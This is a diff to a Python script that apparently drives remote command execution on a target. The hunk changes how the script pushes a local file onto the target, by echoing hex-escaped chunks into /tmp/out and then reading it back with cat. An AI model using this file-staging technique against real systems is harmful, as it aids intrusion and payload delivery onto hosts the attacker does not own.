@@ -60,15 +60,15 @@ if args.file:
     execute('rm /tmp/out', headers, args.html2text, args.proxy, params)
 
     with open(args.file, 'rb') as f:
-        read = f.read(10)
+        read = f.read(230)
         while len(read) > 0:
             chunk = b''
             print(read)
             for c in read:
                 chunk += b'\\x' + binascii.b2a_hex(c.to_bytes(1, byteorder='big'))
-            command = (f'echo -ne \'{chunk.decode()}\' >> /tmp/out')
+            command = (f'/bin/echo -ne \'{chunk.decode()}\' >> /tmp/out')
             execute(command, headers, args.html2text, args.proxy, params)
-            read = f.read(10)
+            read = f.read(230)
     execute('cat /tmp/out', headers, args.html2text, args.proxy, params)
 
 if commands is not None and len(commands) != 0:
